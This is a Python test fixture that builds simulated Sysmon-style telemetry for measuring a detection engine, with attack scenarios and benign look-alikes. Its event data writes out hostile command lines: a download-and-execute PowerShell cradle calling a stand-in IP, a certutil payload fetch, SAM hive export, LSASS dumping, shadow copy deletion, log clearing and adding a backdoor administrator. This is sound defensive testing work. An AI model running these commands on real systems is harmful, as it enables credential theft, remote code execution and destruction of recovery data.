"""Safe attack simulation scenarios.

Nothing here executes malware or touches a real system: every scenario is a list of *telemetry events* in the schema
the agent sends, modelled on what Sysmon / Windows Security would log for the technique. Each scenario carries its
ground truth (`expected` rule ids) so detection accuracy can be measured. `benign` scenarios are look-alikes that
must NOT alert (they measure false positives).
"""
from datetime import datetime, timedelta, timezone

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
B64 = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="


def _e(t, etype, off, proc=None, parent=None, cmd=None, user=None, **details):
    return {"event_type": etype, "timestamp": (t + timedelta(seconds=off)).isoformat(), "process_name": proc,
            "parent_process": parent, "command_line": cmd, "user": user, "details": details}


def build(now: datetime | None = None) -> list[dict]:
    t = (now or datetime.now(timezone.utc)) - timedelta(seconds=2)
    U = {"fin": r"LAB\jsmith", "adm": r"LAB\tkgosi", "hr": r"LAB\mdlamini", "sales": r"LAB\kmotsumi", "ops": r"LAB\rseretse"}
    S = []

    def add(sid, kind, name, tech, expected, user, events):
        S.append({"id": sid, "kind": kind, "name": name, "technique": tech, "expected": expected, "user": user,
                  "events": events})

    # ---------------- attacks (one per rule) ----------------
    u = U["fin"]
    add("A01", "attack", "Encoded PowerShell", "T1059.001", ["R001"], u,
        [_e(t, "process_create", 0, PS, r"C:\Windows\explorer.exe", f"powershell.exe -NoP -W Hidden -enc {B64}", u)])
    add("A02", "attack", "Word macro spawns PowerShell", "T1204.002", ["R002"], U["hr"],
        [_e(t, "process_create", 0, PS, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')", U["hr"])])
    add("A03", "attack", "LSASS memory access", "T1003.001", ["R003"], U["adm"],
        [_e(t, "process_access", 0, r"C:\Users\Public\procdump.exe", user=U["adm"],
            target_process=r"C:\Windows\System32\lsass.exe", granted_access="0x1fffff")])
    add("A04", "attack", "Run key persistence", "T1547.001", ["R004"], U["sales"],
        [_e(t, "registry_set", 0, r"C:\Users\kmotsumi\AppData\Local\Temp\upd.exe", user=U["sales"],
            registry_key=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
            value=r"C:\Users\kmotsumi\AppData\Roaming\upd.exe")])
    add("A05", "attack", "Scheduled task persistence", "T1053.005", ["R005"], U["sales"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\schtasks.exe", CMD,
            r'schtasks /create /tn "Updater" /tr C:\Users\Public\a.exe /sc minute /mo 5', U["sales"])])
    add("A06", "attack", "Shadow copy deletion", "T1490", ["R006"], U["ops"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\vssadmin.exe", CMD, "vssadmin.exe delete shadows /all /quiet", U["ops"])])
    add("A07", "attack", "certutil download", "T1105", ["R007"], U["fin"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\certutil.exe", CMD,
            "certutil.exe -urlcache -split -f http://203.0.113.9/payload.bin C:\\Users\\Public\\p.bin", U["fin"])])
    add("A08", "attack", "Domain admin discovery", "T1087.002", ["R008"], U["hr"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\net.exe", CMD, 'net group "Domain Admins" /domain', U["hr"])])
    add("A09", "attack", "Brute-force logons", "T1110", ["R009"], r"LAB\tkgosi",
        [_e(t, "logon_failure", i * 3, user=r"LAB\tkgosi", logon_type=3, source_ip="10.0.5.77") for i in range(7)])
    add("A10", "attack", "Ransomware mass encryption", "T1486", ["R010"], U["fin"],
        [_e(t, "file_modify", i * 0.2, r"C:\Users\jsmith\Downloads\invoice.exe", user=U["fin"],
            file_path=f"C:\\Users\\jsmith\\Documents\\file{i}.docx.locked") for i in range(30)])
    add("A11", "attack", "Event log cleared", "T1070.001", ["R011"], U["adm"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\wevtutil.exe", CMD, "wevtutil.exe cl Security", U["adm"])])
    add("A12", "attack", "PowerShell to public IP", "T1071.001", ["R012"], U["sales"],
        [_e(t, "network_connect", 0, PS, user=U["sales"], dest_ip="45.76.12.34", dest_port=443)])
    add("A13", "attack", "SAM hive export", "T1003.002", ["R013"], U["adm"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\reg.exe", CMD, r"reg.exe save HKLM\SAM C:\Temp\sam.save", U["adm"])])
    add("A14", "attack", "Add local administrator", "T1098", ["R014"], U["ops"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\net.exe", CMD, "net localgroup administrators backdoor /add", U["ops"])])
    add("A15", "attack", "Multi-stage intrusion (phish -> persist -> dump -> ransom prep)", "chain",
        ["R002", "R004", "R003", "R006"], U["adm"], [
            _e(t, "process_create", 0, PS, r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "powershell.exe -c whoami", U["adm"]),
            _e(t, "registry_set", 4, r"C:\Users\tkgosi\AppData\Local\Temp\x.exe", user=U["adm"],
               registry_key=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\Sync", value="x"),
            _e(t, "process_access", 8, r"C:\Users\Public\m.exe", user=U["adm"], target_process=r"C:\Windows\System32\lsass.exe", granted_access="0x1010"),
            _e(t, "process_create", 12, r"C:\Windows\System32\vssadmin.exe", CMD, "vssadmin delete shadows /all", U["adm"])])

    # ---------------- benign look-alikes (must not alert) ----------------
    add("B01", "benign", "Plain PowerShell script", "-", [], U["fin"],
        [_e(t, "process_create", 0, PS, r"C:\Windows\explorer.exe", "powershell.exe -File C:\\Scripts\\backup.ps1", U["fin"])])
    add("B02", "benign", "Defender reads LSASS", "-", [], r"NT AUTHORITY\SYSTEM",
        [_e(t, "process_access", 0, r"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe", user=r"NT AUTHORITY\SYSTEM",
            target_process=r"C:\Windows\System32\lsass.exe", granted_access="0x1410")])
    add("B03", "benign", "OneDrive Run key", "-", [], U["hr"],
        [_e(t, "registry_set", 0, r"C:\Users\mdlamini\AppData\Local\Microsoft\OneDrive\OneDriveSetup.exe", user=U["hr"],
            registry_key=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive", value="od.exe")])
    add("B04", "benign", "schtasks query", "-", [], U["adm"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\schtasks.exe", CMD, "schtasks /query /fo LIST", U["adm"])])
    add("B05", "benign", "PowerShell to internal server", "-", [], U["fin"],
        [_e(t, "network_connect", 0, PS, user=U["fin"], dest_ip="10.0.0.12", dest_port=5985)])
    add("B06", "benign", "Word saves documents", "-", [], U["hr"],
        [_e(t, "file_modify", i * 0.1, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", user=U["hr"],
            file_path=f"C:\\Users\\mdlamini\\Documents\\report{i}.docx") for i in range(30)])
    add("B07", "benign", "Three mistyped passwords", "-", [], U["sales"],
        [_e(t, "logon_failure", i * 5, user=U["sales"], logon_type=2, source_ip="10.0.5.20") for i in range(3)])
    add("B08", "benign", "certutil verifies a certificate", "-", [], U["adm"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\certutil.exe", CMD, "certutil -verify C:\\certs\\site.cer", U["adm"])])
    add("B09", "benign", "whoami", "-", [], U["fin"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\whoami.exe", CMD, "whoami", U["fin"])])
    add("B10", "benign", "Office child: splwow64 printing", "-", [], U["hr"],
        [_e(t, "process_create", 0, r"C:\Windows\splwow64.exe", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "splwow64.exe 12288", U["hr"])])
    add("B11", "benign", "Installer writes Run key", "-", [], U["ops"],
        [_e(t, "registry_set", 0, r"C:\Windows\System32\msiexec.exe", user=U["ops"],
            registry_key=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VendorTray", value="tray.exe")])
    add("B12", "benign", "Local group listing", "-", [], U["ops"],
        [_e(t, "process_create", 0, r"C:\Windows\System32\net.exe", CMD, "net localgroup administrators", U["ops"])])
    add("B13", "benign", "Service account activity (system)", "-", [], r"NT AUTHORITY\SYSTEM",
        [_e(t, "process_create", 0, r"C:\Windows\System32\svchost.exe", r"C:\Windows\System32\services.exe", "svchost.exe -k netsvcs", r"NT AUTHORITY\SYSTEM")])
    return S


def baseline_noise(n: int, user: str, now: datetime | None = None) -> list[dict]:
    """Ordinary workstation activity used for throughput and false-positive testing."""
    t = (now or datetime.now(timezone.utc)) - timedelta(seconds=30)
    procs = [(r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Windows\explorer.exe", "chrome.exe --type=renderer"),
             (r"C:\Windows\explorer.exe", r"C:\Windows\System32\userinit.exe", "explorer.exe"),
             (r"C:\Windows\System32\svchost.exe", r"C:\Windows\System32\services.exe", "svchost.exe -k netsvcs"),
             (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", r"C:\Windows\explorer.exe", "outlook.exe"),
             (r"C:\Windows\System32\notepad.exe", r"C:\Windows\explorer.exe", "notepad.exe notes.txt")]
    out = []
    for i in range(n):
        p, par, cmd = procs[i % len(procs)]
        if i % 4 == 3:
            out.append(_e(t, "file_create", i * 0.01, p, user=user, file_path=f"C:\\Users\\x\\AppData\\Local\\Temp\\tmp{i}.dat"))
        else:
            out.append(_e(t, "process_create", i * 0.01, p, par, f"{cmd} --id={i}", user))
    return out
